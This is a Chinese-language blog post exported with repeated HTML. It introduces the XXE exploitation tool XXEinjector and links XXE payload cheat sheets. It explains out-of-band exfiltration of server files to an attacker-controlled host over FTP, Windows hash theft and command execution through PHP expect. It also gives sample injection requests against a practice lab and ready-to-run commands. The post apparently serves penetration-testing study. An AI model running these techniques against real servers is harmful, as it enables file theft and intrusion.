Cheatsheet\n\nhttps://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html\n\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection\n\n## 二、XXEinjector工具\n\n### 0x00 XXEinjector概述\n\nXXEinjector 是一款XXE Fuzz漏洞利用工具。\n\nXXEinjector 用于检索（爆破）存在XXE漏洞的目标服务器的文件或目录。\n\nXXEinjector 可以使用直接检索和带外的方式。\n\n<!-- more -->\n\nXXEinjector 的目录遍历（`--path`）只能用于Java应用程序。其他类型的应用程序只能使用爆破（`--brute`）的方法。\n\n带外方式要求目标主机可以访问我们指定的主机（`--host`），因为采用带外方式时目标主机需要从我们指定的IP上获取恶意dtd文件，以及会将检索到的文件以FTP传输的方式传输到该IP上。（XXEinjector会自动运行WEB服务以及恶意dtd文件以及FTP服务器。）\n\n工具地址：https://github.com/enjoiz/XXEinjector\n\n### 0x01 基本重要参数使用方法\n\n`--file`：这个参数是必选项，用于指定一个HTTP Request消息的文件。HTTP请求文件中要包含XML，或者可以使用\"XXEINJECT\"来标记注入点。\n\n> ```\n> POST /pikachu/vul/xxe/xxe_1.php HTTP/1.1\n> Host: 192.168.199.111\n> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0\n> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n> Accept-Encoding: gzip, deflate\n> Referer: http://192.168.199.111/pikachu/vul/xxe/xxe_1.php\n> Content-Type: application/x-www-form-urlencoded\n> Content-Length: 30\n> Connection: close\n> Upgrade-Insecure-Requests: 1\n> \n> xml=XXEINJECT&submit=%E6%8F%90%E4%BA%A4\n> ```\n\n`--path`：指定要遍历的目录或文件。遍历目录只适用于Java应用程序。若是单一文件，则哪种程序都可以用。爆破文件则应使用参数`--brute`。\n\n> `--path=/etc`\n>\n> `--path=s://test.txt`\n\n`--brute`：该选项用于爆破文件，用于指定包含`文件路径`的字典文件。结果在`brute.log`文件中。\n\n> ```\n> s://test.txt\n> s://test1.txt\n> /etc/passwd\n> ```\n\n**工具包含直接和带外两种检索文件的方式。**\n\n**默认是带外方式：**\n\n`--oob=ftp/http/gopher`：带外方式提供ftp(默认)、http、gopher三种协议。\n\n> - ftp协议适用于任意类型WEB程序。\n> - http、gopher协议只适用于Java < 1.7的Java WEB应用程序。\n\n`--host`：采用带外方式时，必选项。用于指定反连接IP。目标主机会从该IP获取恶意dtd文件，以及会将我们要获取的文件发到该IP的ftp上。\n\n`--httpport`：`--host`指定的主机监听的WEB服务端口。默认80\n\n`--ftpport`：`--host`指定的主机监听的FTP服务端口。默认21\n\n**直接方式**\n\n`--direct`：表示采用直接方式。还需要用一个独特的字符串作为该参数的值，具体看参数解释。\n\n**其他参数：**\n\n`--verbose`：显示详细信息，可以显示攻击数据包等。推荐使用。\n\n`--phpfilter`：使用PHP filter对检索文件进行Base64编码。\n\n`--ssl`：用于https站点。\n\n`--expect`：使用 PHP expect 扩展执行系统命令。\n\n`--output`：`--brute`输出结果保留的文件。\n\n### 0x03 使用实例\n\n- `ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --path=s://test.txt --verbose --phpfilter`\n\n> 结果在Logs\\IP\\目录下。\n\n- `ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --brute=filepath.txt --verbose --phpfilter --ssl`\n\n> 结果在brute.log文件中。\n\n```\n--host\t    必选项 - our IP address for reverse connections. (--host=192.168.0.2)\n--file\t    必选项 - 包含XML的HTTP Request文件。你也可以在请求文件中用\"XXEINJECT\"来标记的注入点。                      (--file=/tmp/req.txt)\n\n--path\t    如果要枚举目录，这是必选项 - 要枚举的目录路径。 (--path=/etc)\n--brute\t    如果要枚举文件，这是必选项 - 包含要枚举的文件路径的字典文件。 (--brute=/tmp/brute.txt)\n--logger    Log results only. Do not send requests. HTTP logger looks for \"p\" parameter with             results.\n  \n--rhost\t    目标主机的IP或者域名. 只有在Request文件中没用HOST头部时才使用. (--rhost=192.168.0.3)\n--rport\t    目标主机的端口. 只有在Request文件中没用HOST头部时才使用，没有默认值. (--rport=8080)\n\n--oob\t    带外漏洞利用方法. FTP是默认的方法且FTP可以用于任意WEB程序中.HTTP只能用于爆破Java < 1.7             的WEB程序的文件或目录. Gopher只能用于爆破Java < 1.7的WEB程序的文件或目录. (--                     oob=http/ftp/gopher)\n\n--direct\t直接利用漏洞而不是带外方法. Unique mark should be specified as a value for this                 argument. This mark specifies where results of XXE start and end. Specify --xml               to see how XML in request file should look like. (--direct=UNIQUEMARK)\n\n--cdata\t    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB               is used to construct CDATA payload. Specify --cdata-xml to see how request should             look like in this technique.\n\n--2ndfile\tFile containing valid HTTP request used in second order exploitation. \n\t\t\t(--2ndfile=/tmp/2ndreq.txt)\n\n--phpfilter\t使用PHP filter对文件进行Base64编码.\n--netdoc    使用netdoc协议而不是file协议。 (Java).\n--enumports\tEnumerating unfiltered ports for reverse connection. Specify value \"all\" to     \t\t\tenumerate all TCP ports. (--enumports=21,22,80,443,445)\n\n--hashes\t窃取Windows哈希值.\n--expect\t使用 PHP expect 扩展执行系统命令. (--expect=ls)\n--upload\tUploads specified file using Java jar schema into temp file. (--                              upload=/tmp/upload.txt)\n\n--xslt\t    Tests for XSLT injection.\n\n--ssl\t    Use SSL.\n--proxy\t    Proxy to use. (--proxy=127.0.0.1:8080)\n--httpport\t   Set custom HTTP port. (--httpport=80)\n--ftpport\t   Set custom FTP port. (--ftpport=21)\n--gopherport   Set custom gopher port. (--gopherport=70)\n--jarport\t   Set custom port for uploading files using jar. (--jarport=1337)\n--xsltport\t   Set custom port for XSLT injection test. (--xsltport=1337)\n\n--test\t    该参数用于测试校验Payload。会将发送的Payload显示出来而不会发送到目标主机。\n\n--urlencode\tURL encode injected DTD. This is default for URI.\n--nodtd\t     该参数用于想使用自己提供的dtd文件时，工具默认会生成并使用dtd文件。使用\"--dtd\"可以看dtd              文件格式。\n\n--output\t爆破的结果输出到的文件。 默认情况下爆破的结果存放在brute.log文件中\n\t\t\t(--output=/tmp/out.txt)\n\n--timeout\t    Timeout for receiving file/directory content. (--timeout=20)\n--contimeout\tTimeout for closing connection with server. This is used to prevent DoS                        condition. (--contimeout=20)\n\n--fast\t    Skip asking what to enumerate. Prone to false-positives.\n--verbose\t    Show verbose messages.\n```\n\n## 0x03 XXE学习资源\n\nhttps://nosec.org/home/detail/2139.html","slug":"xxe-tool","published":1,"updated":"2019-03-04T08:29:56.362Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjszpjg8k000dj8r0o5gz856y","content":"<h2 id=\"一、XXE-Payload-Cheatsheet\"><a href=\"#一、XXE-Payload-Cheatsheet\" class=\"headerlink\" title=\"一、XXE Payload Cheatsheet\"></a>一、XXE Payload Cheatsheet</h2><p><a href=\"https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html\" target=\"_blank\" rel=\"noopener\">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a></p>\n<p><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection\" target=\"_blank\" rel=\"noopener\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection</a></p>\n<h2 id=\"二、XXEinjector工具\"><a href=\"#二、XXEinjector工具\" class=\"headerlink\" title=\"二、XXEinjector工具\"></a>二、XXEinjector工具</h2><h3 id=\"0x00-XXEinjector概述\"><a href=\"#0x00-XXEinjector概述\" class=\"headerlink\" title=\"0x00 XXEinjector概述\"></a>0x00 XXEinjector概述</h3><p>XXEinjector 是一款XXE Fuzz漏洞利用工具。</p>\n<p>XXEinjector 用于检索（爆破）存在XXE漏洞的目标服务器的文件或目录。</p>\n<p>XXEinjector 可以使用直接检索和带外的方式。</p>\n<a id=\"more\"></a>\n<p>XXEinjector 的目录遍历（<code>--path</code>）只能用于Java应用程序。其他类型的应用程序只能使用爆破（<code>--brute</code>）的方法。</p>\n<p>带外方式要求目标主机可以访问我们指定的主机（<code>--host</code>），因为采用带外方式时目标主机需要从我们指定的IP上获取恶意dtd文件，以及会将检索到的文件以FTP传输的方式传输到该IP上。（XXEinjector会自动运行WEB服务以及恶意dtd文件以及FTP服务器。）</p>\n<p>工具地址：<a href=\"https://github.com/enjoiz/XXEinjector\" target=\"_blank\" rel=\"noopener\">https://github.com/enjoiz/XXEinjector</a></p>\n<h3 id=\"0x01-基本重要参数使用方法\"><a href=\"#0x01-基本重要参数使用方法\" class=\"headerlink\" title=\"0x01 基本重要参数使用方法\"></a>0x01 基本重要参数使用方法</h3><p><code>--file</code>：这个参数是必选项，用于指定一个HTTP Request消息的文件。HTTP请求文件中要包含XML，或者可以使用”XXEINJECT”来标记注入点。</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; POST /pikachu/vul/xxe/xxe_1.php HTTP/1.1</span><br><span class=\"line\">&gt; Host: 192.168.199.111</span><br><span class=\"line\">&gt; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class=\"line\">&gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\">&gt; Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">&gt; Accept-Encoding: gzip, deflate</span><br><span class=\"line\">&gt; Referer: http://192.168.199.111/pikachu/vul/xxe/xxe_1.php</span><br><span class=\"line\">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">&gt; Content-Length: 30</span><br><span class=\"line\">&gt; Connection: close</span><br><span class=\"line\">&gt; Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; xml=XXEINJECT&amp;submit=%E6%8F%90%E4%BA%A4</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><code>--path</code>：指定要遍历的目录或文件。遍历目录只适用于Java应用程序。若是单一文件，则哪种程序都可以用。爆破文件则应使用参数<code>--brute</code>。</p>\n<blockquote>\n<p><code>--path=/etc</code></p>\n<p><code>--path=s://test.txt</code></p>\n</blockquote>\n<p><code>--brute</code>：该选项用于爆破文件，用于指定包含<code>文件路径</code>的字典文件。结果在<code>brute.log</code>文件中。</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; s://test.txt</span><br><span class=\"line\">&gt; s://test1.txt</span><br><span class=\"line\">&gt; /etc/passwd</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>工具包含直接和带外两种检索文件的方式。</strong></p>\n<p><strong>默认是带外方式：</strong></p>\n<p><code>--oob=ftp/http/gopher</code>：带外方式提供ftp(默认)、http、gopher三种协议。</p>\n<blockquote>\n<ul>\n<li>ftp协议适用于任意类型WEB程序。</li>\n<li>http、gopher协议只适用于Java &lt; 1.7的Java WEB应用程序。</li>\n</ul>\n</blockquote>\n<p><code>--host</code>：采用带外方式时，必选项。用于指定反连接IP。目标主机会从该IP获取恶意dtd文件，以及会将我们要获取的文件发到该IP的ftp上。</p>\n<p><code>--httpport</code>：<code>--host</code>指定的主机监听的WEB服务端口。默认80</p>\n<p><code>--ftpport</code>：<code>--host</code>指定的主机监听的FTP服务端口。默认21</p>\n<p><strong>直接方式</strong></p>\n<p><code>--direct</code>：表示采用直接方式。还需要用一个独特的字符串作为该参数的值，具体看参数解释。</p>\n<p><strong>其他参数：</strong></p>\n<p><code>--verbose</code>：显示详细信息，可以显示攻击数据包等。推荐使用。</p>\n<p><code>--phpfilter</code>：使用PHP filter对检索文件进行Base64编码。</p>\n<p><code>--ssl</code>：用于https站点。</p>\n<p><code>--expect</code>：使用 PHP expect 扩展执行系统命令。</p>\n<p><code>--output</code>：<code>--brute</code>输出结果保留的文件。</p>\n<h3 id=\"0x03-使用实例\"><a href=\"#0x03-使用实例\" class=\"headerlink\" title=\"0x03 使用实例\"></a>0x03 使用实例</h3><ul>\n<li><code>ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --path=s://test.txt --verbose --phpfilter</code></li>\n</ul>\n<blockquote>\n<p>结果在Logs\\IP\\目录下。</p>\n</blockquote>\n<ul>\n<li><code>ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --brute=filepath.txt --verbose --phpfilter --ssl</code></li>\n</ul>\n<blockquote>\n<p>结果在brute.log文件中。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--host\t    必选项 - our IP address for reverse connections. (--host=192.168.0.2)</span><br><span class=\"line\">--file\t    必选项 - 包含XML的HTTP Request文件。你也可以在请求文件中用&quot;XXEINJECT&quot;来标记的注入点。                      (--file=/tmp/req.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--path\t    如果要枚举目录，这是必选项 - 要枚举的目录路径。 (--path=/etc)</span><br><span class=\"line\">--brute\t    如果要枚举文件，这是必选项 - 包含要枚举的文件路径的字典文件。 (--brute=/tmp/brute.txt)</span><br><span class=\"line\">--logger    Log results only. Do not send requests. HTTP logger looks for &quot;p&quot; parameter with             results.</span><br><span class=\"line\">  </span><br><span class=\"line\">--rhost\t    目标主机的IP或者域名. 只有在Request文件中没用HOST头部时才使用. (--rhost=192.168.0.3)</span><br><span class=\"line\">--rport\t    目标主机的端口. 只有在Request文件中没用HOST头部时才使用，没有默认值. (--rport=8080)</span><br><span class=\"line\"></span><br><span class=\"line\">--oob\t    带外漏洞利用方法. FTP是默认的方法且FTP可以用于任意WEB程序中.HTTP只能用于爆破Java &lt; 1.7             的WEB程序的文件或目录. Gopher只能用于爆破Java &lt; 1.7的WEB程序的文件或目录. (--                     oob=http/ftp/gopher)</span><br><span class=\"line\"></span><br><span class=\"line\">--direct\t直接利用漏洞而不是带外方法. Unique mark should be specified as a value for this                 argument. This mark specifies where results of XXE start and end. Specify --xml               to see how XML in request file should look like. (--direct=UNIQUEMARK)</span><br><span class=\"line\"></span><br><span class=\"line\">--cdata\t    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB               is used to construct CDATA payload. Specify --cdata-xml to see how request should             look like in this technique.</span><br><span class=\"line\"></span><br><span class=\"line\">--2ndfile\tFile containing valid HTTP request used in second order exploitation. </span><br><span class=\"line\">\t\t\t(--2ndfile=/tmp/2ndreq.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--phpfilter\t使用PHP filter对文件进行Base64编码.</span><br><span class=\"line\">--netdoc    使用netdoc协议而不是file协议。 (Java).</span><br><span class=\"line\">--enumports\tEnumerating unfiltered ports for reverse connection. Specify value &quot;all&quot; to     \t\t\tenumerate all TCP ports. (--enumports=21,22,80,443,445)</span><br><span class=\"line\"></span><br><span class=\"line\">--hashes\t窃取Windows哈希值.</span><br><span class=\"line\">--expect\t使用 PHP expect 扩展执行系统命令. (--expect=ls)</span><br><span class=\"line\">--upload\tUploads specified file using Java jar schema into temp file. (--                              upload=/tmp/upload.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--xslt\t    Tests for XSLT injection.</span><br><span class=\"line\"></span><br><span class=\"line\">--ssl\t    Use SSL.</span><br><span class=\"line\">--proxy\t    Proxy to use. (--proxy=127.0.0.1:8080)</span><br><span class=\"line\">--httpport\t   Set custom HTTP port. (--httpport=80)</span><br><span class=\"line\">--ftpport\t   Set custom FTP port. (--ftpport=21)</span><br><span class=\"line\">--gopherport   Set custom gopher port. (--gopherport=70)</span><br><span class=\"line\">--jarport\t   Set custom port for uploading files using jar. (--jarport=1337)</span><br><span class=\"line\">--xsltport\t   Set custom port for XSLT injection test. (--xsltport=1337)</span><br><span class=\"line\"></span><br><span class=\"line\">--test\t    该参数用于测试校验Payload。会将发送的Payload显示出来而不会发送到目标主机。</span><br><span class=\"line\"></span><br><span class=\"line\">--urlencode\tURL encode injected DTD. This is default for URI.</span><br><span class=\"line\">--nodtd\t     该参数用于想使用自己提供的dtd文件时，工具默认会生成并使用dtd文件。使用&quot;--dtd&quot;可以看dtd              文件格式。</span><br><span class=\"line\"></span><br><span class=\"line\">--output\t爆破的结果输出到的文件。 默认情况下爆破的结果存放在brute.log文件中</span><br><span class=\"line\">\t\t\t(--output=/tmp/out.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--timeout\t    Timeout for receiving file/directory content. (--timeout=20)</span><br><span class=\"line\">--contimeout\tTimeout for closing connection with server. This is used to prevent DoS                        condition. (--contimeout=20)</span><br><span class=\"line\"></span><br><span class=\"line\">--fast\t    Skip asking what to enumerate. Prone to false-positives.</span><br><span class=\"line\">--verbose\t    Show verbose messages.</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x03-XXE学习资源\"><a href=\"#0x03-XXE学习资源\" class=\"headerlink\" title=\"0x03 XXE学习资源\"></a>0x03 XXE学习资源</h2><p><a href=\"https://nosec.org/home/detail/2139.html\" target=\"_blank\" rel=\"noopener\">https://nosec.org/home/detail/2139.html</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、XXE-Payload-Cheatsheet\"><a href=\"#一、XXE-Payload-Cheatsheet\" class=\"headerlink\" title=\"一、XXE Payload Cheatsheet\"></a>一、XXE Payload Cheatsheet</h2><p><a href=\"https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html\" target=\"_blank\" rel=\"noopener\">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a></p>\n<p><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection\" target=\"_blank\" rel=\"noopener\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection</a></p>\n<h2 id=\"二、XXEinjector工具\"><a href=\"#二、XXEinjector工具\" class=\"headerlink\" title=\"二、XXEinjector工具\"></a>二、XXEinjector工具</h2><h3 id=\"0x00-XXEinjector概述\"><a href=\"#0x00-XXEinjector概述\" class=\"headerlink\" title=\"0x00 XXEinjector概述\"></a>0x00 XXEinjector概述</h3><p>XXEinjector 是一款XXE Fuzz漏洞利用工具。</p>\n<p>XXEinjector 用于检索（爆破）存在XXE漏洞的目标服务器的文件或目录。</p>\n<p>XXEinjector 可以使用直接检索和带外的方式。</p>","more":"<p>XXEinjector 的目录遍历（<code>--path</code>）只能用于Java应用程序。其他类型的应用程序只能使用爆破（<code>--brute</code>）的方法。</p>\n<p>带外方式要求目标主机可以访问我们指定的主机（<code>--host</code>），因为采用带外方式时目标主机需要从我们指定的IP上获取恶意dtd文件，以及会将检索到的文件以FTP传输的方式传输到该IP上。（XXEinjector会自动运行WEB服务以及恶意dtd文件以及FTP服务器。）</p>\n<p>工具地址：<a href=\"https://github.com/enjoiz/XXEinjector\" target=\"_blank\" rel=\"noopener\">https://github.com/enjoiz/XXEinjector</a></p>\n<h3 id=\"0x01-基本重要参数使用方法\"><a href=\"#0x01-基本重要参数使用方法\" class=\"headerlink\" title=\"0x01 基本重要参数使用方法\"></a>0x01 基本重要参数使用方法</h3><p><code>--file</code>：这个参数是必选项，用于指定一个HTTP Request消息的文件。HTTP请求文件中要包含XML，或者可以使用”XXEINJECT”来标记注入点。</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; POST /pikachu/vul/xxe/xxe_1.php HTTP/1.1</span><br><span class=\"line\">&gt; Host: 192.168.199.111</span><br><span class=\"line\">&gt; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class=\"line\">&gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\">&gt; Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">&gt; Accept-Encoding: gzip, deflate</span><br><span class=\"line\">&gt; Referer: http://192.168.199.111/pikachu/vul/xxe/xxe_1.php</span><br><span class=\"line\">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">&gt; Content-Length: 30</span><br><span class=\"line\">&gt; Connection: close</span><br><span class=\"line\">&gt; Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; xml=XXEINJECT&amp;submit=%E6%8F%90%E4%BA%A4</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><code>--path</code>：指定要遍历的目录或文件。遍历目录只适用于Java应用程序。若是单一文件，则哪种程序都可以用。爆破文件则应使用参数<code>--brute</code>。</p>\n<blockquote>\n<p><code>--path=/etc</code></p>\n<p><code>--path=s://test.txt</code></p>\n</blockquote>\n<p><code>--brute</code>：该选项用于爆破文件，用于指定包含<code>文件路径</code>的字典文件。结果在<code>brute.log</code>文件中。</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; s://test.txt</span><br><span class=\"line\">&gt; s://test1.txt</span><br><span class=\"line\">&gt; /etc/passwd</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>工具包含直接和带外两种检索文件的方式。</strong></p>\n<p><strong>默认是带外方式：</strong></p>\n<p><code>--oob=ftp/http/gopher</code>：带外方式提供ftp(默认)、http、gopher三种协议。</p>\n<blockquote>\n<ul>\n<li>ftp协议适用于任意类型WEB程序。</li>\n<li>http、gopher协议只适用于Java &lt; 1.7的Java WEB应用程序。</li>\n</ul>\n</blockquote>\n<p><code>--host</code>：采用带外方式时，必选项。用于指定反连接IP。目标主机会从该IP获取恶意dtd文件，以及会将我们要获取的文件发到该IP的ftp上。</p>\n<p><code>--httpport</code>：<code>--host</code>指定的主机监听的WEB服务端口。默认80</p>\n<p><code>--ftpport</code>：<code>--host</code>指定的主机监听的FTP服务端口。默认21</p>\n<p><strong>直接方式</strong></p>\n<p><code>--direct</code>：表示采用直接方式。还需要用一个独特的字符串作为该参数的值，具体看参数解释。</p>\n<p><strong>其他参数：</strong></p>\n<p><code>--verbose</code>：显示详细信息，可以显示攻击数据包等。推荐使用。</p>\n<p><code>--phpfilter</code>：使用PHP filter对检索文件进行Base64编码。</p>\n<p><code>--ssl</code>：用于https站点。</p>\n<p><code>--expect</code>：使用 PHP expect 扩展执行系统命令。</p>\n<p><code>--output</code>：<code>--brute</code>输出结果保留的文件。</p>\n<h3 id=\"0x03-使用实例\"><a href=\"#0x03-使用实例\" class=\"headerlink\" title=\"0x03 使用实例\"></a>0x03 使用实例</h3><ul>\n<li><code>ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --path=s://test.txt --verbose --phpfilter</code></li>\n</ul>\n<blockquote>\n<p>结果在Logs\\IP\\目录下。</p>\n</blockquote>\n<ul>\n<li><code>ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --brute=filepath.txt --verbose --phpfilter --ssl</code></li>\n</ul>\n<blockquote>\n<p>结果在brute.log文件中。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--host\t    必选项 - our IP address for reverse connections. (--host=192.168.0.2)</span><br><span class=\"line\">--file\t    必选项 - 包含XML的HTTP Request文件。你也可以在请求文件中用&quot;XXEINJECT&quot;来标记的注入点。                      (--file=/tmp/req.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--path\t    如果要枚举目录，这是必选项 - 要枚举的目录路径。 (--path=/etc)</span><br><span class=\"line\">--brute\t    如果要枚举文件，这是必选项 - 包含要枚举的文件路径的字典文件。 (--brute=/tmp/brute.txt)</span><br><span class=\"line\">--logger    Log results only. Do not send requests. HTTP logger looks for &quot;p&quot; parameter with             results.</span><br><span class=\"line\">  </span><br><span class=\"line\">--rhost\t    目标主机的IP或者域名. 只有在Request文件中没用HOST头部时才使用. (--rhost=192.168.0.3)</span><br><span class=\"line\">--rport\t    目标主机的端口. 只有在Request文件中没用HOST头部时才使用，没有默认值. (--rport=8080)</span><br><span class=\"line\"></span><br><span class=\"line\">--oob\t    带外漏洞利用方法. FTP是默认的方法且FTP可以用于任意WEB程序中.HTTP只能用于爆破Java &lt; 1.7             的WEB程序的文件或目录. Gopher只能用于爆破Java &lt; 1.7的WEB程序的文件或目录. (--                     oob=http/ftp/gopher)</span><br><span class=\"line\"></span><br><span class=\"line\">--direct\t直接利用漏洞而不是带外方法. Unique mark should be specified as a value for this                 argument. This mark specifies where results of XXE start and end. Specify --xml               to see how XML in request file should look like. (--direct=UNIQUEMARK)</span><br><span class=\"line\"></span><br><span class=\"line\">--cdata\t    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB               is used to construct CDATA payload. Specify --cdata-xml to see how request should             look like in this technique.</span><br><span class=\"line\"></span><br><span class=\"line\">--2ndfile\tFile containing valid HTTP request used in second order exploitation. </span><br><span class=\"line\">\t\t\t(--2ndfile=/tmp/2ndreq.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--phpfilter\t使用PHP filter对文件进行Base64编码.</span><br><span class=\"line\">--netdoc    使用netdoc协议而不是file协议。 (Java).</span><br><span class=\"line\">--enumports\tEnumerating unfiltered ports for reverse connection. Specify value &quot;all&quot; to     \t\t\tenumerate all TCP ports. (--enumports=21,22,80,443,445)</span><br><span class=\"line\"></span><br><span class=\"line\">--hashes\t窃取Windows哈希值.</span><br><span class=\"line\">--expect\t使用 PHP expect 扩展执行系统命令. (--expect=ls)</span><br><span class=\"line\">--upload\tUploads specified file using Java 